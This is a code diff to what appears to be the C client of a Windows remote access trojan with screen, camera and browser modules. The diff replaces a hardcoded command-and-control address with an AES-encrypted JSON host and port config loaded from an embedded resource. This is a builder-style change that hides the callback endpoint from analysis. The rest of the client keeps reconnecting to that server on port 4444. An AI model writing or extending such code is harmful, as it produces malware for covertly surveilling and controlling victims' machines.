@@ -13,11 +13,12 @@
 #include "screen.h"
 #include "camera.h"
 #include "browser.h"
+#include "config.h"
 
 #pragma comment(lib, "ws2_32.lib")
 
-#define HOST "192.168.1.7"
-#define PORT 4444
+char g_host[256] = "127.0.0.1";
+int g_port = 4444;
 int g_reconnect_delay = 5000;
 
 SessionKey g_session;
@@ -136,7 +137,41 @@ void camera_thread(void* arg) {
     free(sa);
 }
 
+void load_config_from_resource() {
+    HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(IDR_CONFIG), RT_RCDATA);
+    if (!hRes) return;
+
+    HGLOBAL hData = LoadResource(NULL, hRes);
+    if (!hData) return;
+
+    unsigned char* pData = (unsigned char*)LockResource(hData);
+    DWORD dwSize = SizeofResource(NULL, hRes);
+
+    if (dwSize >= CONFIG_RES_SIZE) {
+        size_t plain_len;
+        // Skip the 16-byte marker
+        unsigned char* encrypted_data = pData + 16;
+        size_t encrypted_len = CONFIG_RES_SIZE - 16;
+
+        unsigned char* decrypted = aes_256_cbc_decrypt_raw(encrypted_data, encrypted_len, &plain_len, (unsigned char*)CONFIG_KEY, (unsigned char*)CONFIG_IV);
+        if (decrypted) {
+            decrypted[plain_len] = 0;
+            cJSON* root = cJSON_Parse((char*)decrypted);
+            if (root) {
+                cJSON* host = cJSON_GetObjectItem(root, "host");
+                cJSON* port = cJSON_GetObjectItem(root, "port");
+                if (host) strncpy(g_host, host->valuestring, sizeof(g_host) - 1);
+                if (port) g_port = port->valueint;
+                cJSON_Delete(root);
+            }
+            free(decrypted);
+        }
+    }
+}
+
 int main() {
+    load_config_from_resource();
+
     WSADATA wsa;
     WSAStartup(MAKEWORD(2, 2), &wsa);
     g_send_mutex = CreateMutex(NULL, FALSE, NULL);
@@ -147,8 +182,8 @@ int main() {
         g_sock = socket(AF_INET, SOCK_STREAM, 0);
         struct sockaddr_in server;
         server.sin_family = AF_INET;
-        server.sin_addr.s_addr = inet_addr(HOST);
-        server.sin_port = htons(PORT);
+        server.sin_addr.s_addr = inet_addr(g_host);
+        server.sin_port = htons(g_port);
 
         if (connect(g_sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
             closesocket(g_sock);
